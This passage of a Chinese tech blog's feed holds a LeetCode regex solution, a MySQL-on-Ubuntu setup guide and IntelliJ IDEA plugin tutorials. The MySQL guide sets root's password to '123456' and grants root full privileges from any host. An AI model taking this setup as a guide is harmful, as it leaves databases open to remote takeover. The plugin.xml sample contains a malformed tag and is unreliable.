&quot;aab&quot;。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入:</span><br><span class="line">&gt; s = &quot;mississippi&quot;</span><br><span class="line">&gt; p = &quot;mis*is*p*.&quot;</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>偷懒，直接regex</p><p>详细请参考<a href="https://blog.csdn.net/bwangk/article/details/52664949" target="_blank" rel="noopener">c++ 实现正则表达式匹配</a></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="function">regex <span class="title">reg</span><span class="params">(p)</span></span>;</span><br><span class="line">        <span class="keyword">bool</span> res = regex_match(s, reg);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode"><a class="header-anchor" href="#LeetCode" aria-hidden="true">¶</a> <a href="https://leetcode-cn.com/problemset/all/" target="_blank" rel="noopener">LeetCode</a></h2><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/65914867.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="LeetCode" scheme="http://www.danboard.me/categories/LeetCode/"/>
    
    
      <category term="C/C++" scheme="http://www.danboard.me/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>MySQL配置-Ubuntu</title>
    <link href="http://www.danboard.me/MySQL%E9%85%8D%E7%BD%AE-Ubuntu/"/>
    <id>http://www.danboard.me/MySQL配置-Ubuntu/</id>
    <published>2018-09-27T11:20:05.000Z</published>
    <updated>2018-09-29T14:17:16.095Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-27/85603409.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-27/85603409.jpg"></p><a id="more"></a><h2 id="安装"><a class="header-anchor" href="#安装" aria-hidden="true">¶</a> 安装</h2><ul><li><p>服务端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure></li><li><p>客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo apt-get install mysql-client</span><br></pre></td></tr></table></figure></li><li><p>检查是否安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo netstat -tap | grep mysql</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>ps : 安装过程可能会提示设置密码，按提示完成即可；若是没有提示，可以进行密码修改</p><p>mySQL会自动生成一个用户<code>debian-sys-maint</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> $ sudo vim /etc/mysql/debian.cnf</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>打开用户配置文件，可以查看默认密码，通过登录该用户，来修改root用户的密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> $ mysql -u debian-sys-maint -p</span><br><span class="line"><span class="meta">&gt;</span> # 输入默认秘密</span><br><span class="line"><span class="meta">&gt;</span> &gt; use mysql;</span><br><span class="line"><span class="meta">&gt;</span> &gt; update user set password=password('123456') where user='root';</span><br><span class="line"><span class="meta">&gt;</span> &gt; flush privileges;</span><br><span class="line"><span class="meta">&gt;</span> &gt; exit;</span><br><span class="line"><span class="meta">&gt;</span> # 登录验证</span><br><span class="line"><span class="meta">&gt;</span> $ mysql -u root -p</span><br><span class="line"><span class="meta">&gt;</span> # 输入密码 123456</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="远程访问"><a class="header-anchor" href="#远程访问" aria-hidden="true">¶</a> 远程访问</h2><ul><li><p>配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf  </span><br><span class="line"><span class="meta">#</span> 将bind-address = 127.0.0.1 注释</span><br></pre></td></tr></table></figure></li><li><p>授权</p><p>方式一：改表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> `%`表示其他主机也能连接</span><br><span class="line"><span class="meta">&gt;</span> update user set host = '%' where user = 'root';</span><br><span class="line"><span class="meta">&gt;</span> flush privileges;</span><br><span class="line"><span class="meta">&gt;</span> select user, host from user;</span><br><span class="line">+------------------+-----------+</span><br><span class="line">| user             | host      |</span><br><span class="line">+------------------+-----------+</span><br><span class="line">| root             | %         |</span><br><span class="line">| debian-sys-maint | localhost |</span><br><span class="line">| mysql.session    | localhost |</span><br><span class="line">| mysql.sys        | localhost |</span><br><span class="line">+------------------+-----------+</span><br></pre></td></tr></table></figure><p>方式二：授权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;</span><br><span class="line"><span class="meta">&gt;</span> flush privileges;</span><br></pre></td></tr></table></figure></li><li><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> /etc/init.d/mysql restart</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>ps：如果其他主机还是连接不了mySQL，尝试修改mySQL的加密方式</p><p>出现错误：ERROR 1698 (28000): Access denied for user ‘root’@‘ubuntu’</p><p>详细请看：<a href="https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost" target="_blank" rel="noopener">https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> mysql&gt; select user, plugin from user;</span><br><span class="line"><span class="meta">&gt;</span> +------------------+-----------------------+</span><br><span class="line"><span class="meta">&gt;</span> | user             | plugin                |</span><br><span class="line"><span class="meta">&gt;</span> +------------------+-----------------------+</span><br><span class="line"><span class="meta">&gt;</span> | root             | auth_socket |</span><br><span class="line"><span class="meta">&gt;</span> | mysql.session    | mysql_native_password |</span><br><span class="line"><span class="meta">&gt;</span> | mysql.sys        | mysql_native_password |</span><br><span class="line"><span class="meta">&gt;</span> | debian-sys-maint | mysql_native_password |</span><br><span class="line"><span class="meta">&gt;</span> +------------------+-----------------------+</span><br><span class="line"><span class="meta">&gt;</span> 4 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">&gt;</span> </span><br><span class="line"><span class="meta">&gt;</span> mysql&gt; update user set plugin='mysql_native_password' where user='root';</span><br><span class="line"><span class="meta">&gt;</span> mysql&gt; flush privileges;</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure></blockquote><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-27/85603409.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-27/85603409.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="数据库" scheme="http://www.danboard.me/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="mysql" scheme="http://www.danboard.me/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>IntelliJ IDEA 插件开发（二）Action解析</title>
    <link href="http://www.danboard.me/IntelliJ-IDEA-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%BA%8C%EF%BC%89Action%E8%A7%A3%E6%9E%90/"/>
    <id>http://www.danboard.me/IntelliJ-IDEA-插件开发（二）Action解析/</id>
    <published>2018-08-18T05:05:59.000Z</published>
    <updated>2018-09-29T14:14:21.482Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg"></p><a id="more"></a><blockquote><p>在plugin中，可以包含多个action，一个action代表一个活动，即一个功能项，比如主菜单栏（或其中子菜单）以及右键菜单中的一项。action继承类AnAction，主要重写的函数有两个，一个是actionPerformed，另一个是Update。</p></blockquote><h2 id="actionPerformed"><a class="header-anchor" href="#actionPerformed" aria-hidden="true">¶</a> actionPerformed</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(AnActionEvent e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> insert action logic here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次点击一个action，即菜单项的时候，就会执行对应的actionPerformed函数</p><p>上一篇博客，先创建一个Project对象，及获取IDEA当前项目（经过测试Windows貌似不用也可以弹出对话框，其他地方就不知道了），接着通过Messages.showMessageDialog来启动一个对话框。</p><p>下一篇博客会讲到自定义对话框样式，原理都是一样的，还是要actionPerformed来获取对话框的一个对象显示出来。</p><p>这里传入的参数是一个AnActionEvent对象，拉到最后有解释。</p><h2 id="update"><a class="header-anchor" href="#update" aria-hidden="true">¶</a> update</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(AnActionEvent e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.update(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>update函数在Action状态发生更新时被调用，当Action状态刷新，即点击主菜单显示action菜单项的时候，IDEA会回调update函数，并且传递AnActionEvent对象，AnActionEvent对象封装了当前action对应的环境。</p><p>简单来说，就是，先执行update，在执行actionPerformed。</p><p>想了解action生命周期的，可以通过日志的形式查看调用。</p><p>下面讲解update的常用情景，当我们在特定环境才需要执行action时（例如指定文件类型），避免其他误操作，我们都会将action隐藏，这里的隐藏指定是最常见的不可操作，即灰处理<code>enable(false)</code> ，当然也可以是<code>visible(false)</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 指定扩展名 */</span></span><br><span class="line"><span class="keyword">private</span> String[] extensions = &#123;<span class="string">"jar"</span>, <span class="string">"xml"</span>, <span class="string">"js"</span>, <span class="string">"html"</span>&#125;;</span><br><span class="line"><span class="keyword">private</span> String extension = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(AnActionEvent e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 读取文件扩展名 */</span></span><br><span class="line">    VirtualFile virtualFile = e.getData(DataKeys.VIRTUAL_FILE);</span><br><span class="line">    <span class="keyword">if</span> (virtualFile != <span class="keyword">null</span>)</span><br><span class="line">        extension = virtualFile.getExtension();</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (String name: extensions)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断 扩展名</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(extension))</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置 action 显隐</span></span><br><span class="line">    e.getPresentation().setEnabled(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AnActionEvent"><a class="header-anchor" href="#AnActionEvent" aria-hidden="true">¶</a> AnActionEvent</h2><blockquote><p>可以发现，上面重载的两个函数，都传入了参数AnActionEvent对象。</p><p>AnActionEvent 是我们与IntelliJ IDEA交互的桥梁，可以通过AnActionEvent对象来获取当前IntelliJ IDEA的各个模块对象，如项目窗口，编辑窗口等等，通过这些对象可以来做一些逻辑操作。</p></blockquote><h3 id="getData 函数"><a class="header-anchor" href="#getData 函数" aria-hidden="true">¶</a> getData 函数</h3><blockquote><p>传入<code>DataKey&lt;T&gt;</code> 或是 <code>PlatformDataKey&lt;T&gt;</code> 对象，它们已经与IntelliJ IDEA工具的对象做了映射。</p></blockquote><p><code>CommonDataKey.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonDataKeys</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> DataKey&lt;Project&gt; PROJECT = DataKey.create(<span class="string">"project"</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> DataKey&lt;Editor&gt; EDITOR = DataKey.create(<span class="string">"editor"</span>);</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PlatformDataKeys.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PlatformDataKeys</span> <span class="keyword">extends</span> <span class="title">CommonDataKeys</span> </span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="getPresentation"><a class="header-anchor" href="#getPresentation" aria-hidden="true">¶</a> getPresentation</h3><blockquote><p>定义action的外观，文本、图标、是否显示等等</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get</span></span><br><span class="line">e.getPresentation().getText();</span><br><span class="line">e.getPresentation().getDescription();</span><br><span class="line"><span class="comment">// set</span></span><br><span class="line">e.getPresentation().setText(<span class="string">"action name"</span>);</span><br><span class="line">e.getPresentation().setIcon(AllIcons.Icon);</span><br><span class="line">e.getPresentation().setEnabled(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a class="header-anchor" href="#参考链接" aria-hidden="true">¶</a> 参考链接</h2><ul><li><p><a href="http://www.jetbrains.org/intellij/sdk/docs/basics/action_system.html" target="_blank" rel="noopener">IntelliJ Platform SDK DevGuide — Actions</a></p></li><li><p><a href="https://blog.csdn.net/huachao1001/article/details/53883500" target="_blank" rel="noopener">AndroidStudio 插件开发（进阶篇之Action机制）</a></p></li></ul><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="IntelliJ IDEA" scheme="http://www.danboard.me/categories/IntelliJ-IDEA/"/>
    
    
      <category term="plugin" scheme="http://www.danboard.me/tags/plugin/"/>
    
  </entry>
  
  <entry>
    <title>IntelliJ IDEA 插件开发（一）Hello World</title>
    <link href="http://www.danboard.me/IntelliJ-IDEA-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%EF%BC%88%E4%B8%80%EF%BC%89Hello-World/"/>
    <id>http://www.danboard.me/IntelliJ-IDEA-插件开发（一）Hello-World/</id>
    <published>2018-08-18T02:08:42.000Z</published>
    <updated>2018-09-29T14:14:55.569Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg"></p><a id="more"></a><h2 id="安装工具"><a class="header-anchor" href="#安装工具" aria-hidden="true">¶</a> 安装工具</h2><blockquote><p>据说，IntelliJ IDEA 被认为是当前 Java 开发效率最快的 IDE 工具。个人感觉用起来也是比较顺手，JetBrains一系列工具的<code>Alt+Enter</code>快速修复功能，简直不要太好了，代码补全也是一级棒。这么好的工具不收费是不可能的，不过有社区版，一般开发者就凑合着用吧；不过JetBrains对学生党也是比较良心的，用教育邮箱注册可以享受一年免费使用权限。</p></blockquote><p>不废话，附上链接 <a href="https://www.jetbrains.com/idea/download/#section=windows" target="_blank" rel="noopener">IntelliJ IDEA</a></p><p>顺便带上，快捷键使用链接<a href="http://wiki.jikexueyuan.com/project/intellij-idea-tutorial/keymap-introduce.html" target="_blank" rel="noopener">Keymap</a></p><h2 id="新建项目"><a class="header-anchor" href="#新建项目" aria-hidden="true">¶</a> 新建项目</h2><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/86452328.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/86452328.jpg"></p><ul><li>目录结构</li></ul><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/50356225.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/50356225.jpg"></p><h2 id="第一个插件"><a class="header-anchor" href="#第一个插件" aria-hidden="true">¶</a> 第一个插件</h2><blockquote><p>三行代码搞定一个“Hello World !”</p></blockquote><h3 id="新建一个Action"><a class="header-anchor" href="#新建一个Action" aria-hidden="true">¶</a> 新建一个Action</h3><p><img src="C:%5CUsers%5CDanboard%5CAppData%5CLocal%5CTemp%5C1534560944970.png" alt="1534560944970"></p><p>如下</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/55637562.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/55637562.jpg"></p><p>最初的样子</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/57552835.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/57552835.jpg"></p><h3 id="进入正题"><a class="header-anchor" href="#进入正题" aria-hidden="true">¶</a> 进入正题</h3><p>三行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(AnActionEvent e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> insert action logic here</span></span><br><span class="line">    Project project = e.getData(PlatformDataKeys.PROJECT);</span><br><span class="line">    Messages.showMessageDialog(project, <span class="string">"Hello World!"</span>, <span class="string">"tips"</span>, Messages.getInformationIcon());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一句：获得一个Project对象</p><p>第二句：弹出一个对话框（信息、标题、图标）</p><p>最关键的一句在后面（其实如果前面创建action的时候，信息都填好了，可以跳过这一步）</p><p><code>plugin.xml</code></p><p>因为关键，所以重点分析</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">idea-plugin</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">id 一个插件的唯一标识，如果有多个插件在测试的时候，注意不要冲突了</span></span><br><span class="line"><span class="comment">    name 插件的名称，安装插件后，可以在配置Settings&gt;Plugins中搜索</span></span><br><span class="line"><span class="comment">    version 插件版本，开发迭代</span></span><br><span class="line"><span class="comment">    vendor 提供商，可以填写自己的信息，方便使用者联系</span></span><br><span class="line"><span class="comment">    description 插件描述，可以说明插件的功能之类</span></span><br><span class="line"><span class="comment">    change-notes 更新的提示</span></span><br><span class="line"><span class="comment">    idea-version IDEA兼容版本 since最早版本  last最新版本</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>com.your.company.unique.plugin.id<span class="tag">&lt;/<span class="name">id</span>&gt;</span>   </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Plugin display name here<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vendor</span> <span class="attr">email</span>=<span class="string">"support@yourcompany.com"</span> <span class="attr">url</span>=<span class="string">"http://www.yourcompany.com"</span>&gt;</span>YourCompany<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">      Enter short description for your plugin here.&lt;br&gt;</span><br><span class="line">      &lt;em&gt;most HTML tags may be used&lt;/em&gt;</span><br><span class="line">    ]]&gt;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">change-notes</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">      Add change notes here.&lt;br&gt;</span><br><span class="line">      &lt;em&gt;most HTML tags may be used&lt;/em&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">change-notes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">idea-version</span> <span class="attr">since-build</span>=<span class="string">"173.0"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--扩展 配置界面</span></span><br><span class="line"><span class="comment">   &lt;aplicationConfigurable&gt; 属性id="xx"、instance(类)、displayname(显示名称)、groupid(位置，默认Other Settings)&gt;</span></span><br><span class="line"><span class="comment">   子标签&lt;configurable&gt; 属性 id(可以设为xx.id，放置下级目录，也可以设置属性parentID="xx")--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">extensions</span> <span class="attr">defaultExtensionNs</span>=<span class="string">"com.intellij"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Add your extensions here --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--Action注册   </span></span><br><span class="line"><span class="comment">  &lt;action&gt; 属性id、类名class、显示text</span></span><br><span class="line"><span class="comment">  子标签&lt;add-to-group&gt; 属性 group-id(菜单项) anchor(位置) relative-to-action(关联位置)</span></span><br><span class="line"><span class="comment">  即action放在group-id里的relative-to-action的前/后  或者最前/后</span></span><br><span class="line"><span class="comment">  子标签&lt;keyboard-shortcut&gt; 定义快捷键</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">actions</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- Add your actions here 这里就是第三句了 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">id</span>=<span class="string">"com.example.test"</span> <span class="attr">class</span>=<span class="string">"HelloWorld"</span> <span class="attr">text</span>=<span class="string">"Hello World"</span></span></span><br><span class="line">       &lt;add-to-group group-id="WindowMenu" anchor="first"/&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">idea-plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="效果展示"><a class="header-anchor" href="#效果展示" aria-hidden="true">¶</a> 效果展示</h3><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/29185559.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/29185559.jpg"></p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/91992093.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-8-18/91992093.jpg"></p><h2 id="官网教程"><a class="header-anchor" href="#官网教程" aria-hidden="true">¶</a> 官网教程</h2><ul><li><a href="http://www.jetbrains.org/intellij/sdk/docs/welcome.html" target="_blank" rel="noopener">IntelliJ Platform SDK DevGuide</a></li></ul><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-9-29/97469795.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
